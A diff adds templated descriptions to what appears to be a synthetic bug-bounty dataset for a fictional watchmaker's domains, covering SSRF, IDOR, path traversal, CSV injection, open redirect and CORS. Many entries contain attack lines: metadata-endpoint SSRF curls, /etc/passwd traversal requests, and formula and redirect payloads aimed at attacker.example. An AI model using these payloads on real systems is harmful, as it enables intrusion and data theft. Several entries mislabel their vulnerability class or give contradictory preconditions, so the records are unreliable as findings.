+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10177,7 +10255,8 @@
           "offset": "4d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10332,7 +10411,8 @@
           "offset": "7d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://dealers.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10439,7 +10519,8 @@
           "offset": "4d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://dealers.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10573,7 +10654,8 @@
           "offset": "7d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10719,7 +10801,8 @@
           "offset": "9d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10870,7 +10953,8 @@
           "offset": "5d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11040,7 +11124,8 @@
           "offset": "6d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11192,7 +11277,8 @@
           "offset": "4d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11380,7 +11466,8 @@
           "offset": "7d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://dealers.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11523,7 +11610,8 @@
           "offset": "3d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dealers.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11650,7 +11738,8 @@
           "offset": "6d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://dealers.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11786,7 +11875,8 @@
           "offset": "10d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11934,7 +12024,8 @@
           "offset": "6d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12057,7 +12148,8 @@
           "offset": "2d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12153,7 +12245,8 @@
           "offset": "3d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12268,7 +12361,8 @@
           "offset": "2d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12420,7 +12514,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12548,7 +12643,8 @@
           "offset": "3d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12708,7 +12804,8 @@
           "offset": "8d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12843,7 +12940,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12937,7 +13035,8 @@
           "offset": "4d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13055,7 +13154,8 @@
           "offset": "4d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13227,7 +13327,8 @@
           "offset": "4d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13318,7 +13419,8 @@
           "offset": "11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13469,7 +13571,8 @@
           "offset": "7d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13621,7 +13724,8 @@
           "offset": "4d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13763,7 +13867,8 @@
           "offset": "4d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13903,7 +14008,8 @@
           "offset": "4d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14054,7 +14160,8 @@
           "offset": "2d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14197,7 +14304,8 @@
           "offset": "5d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14336,7 +14444,8 @@
           "offset": "22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
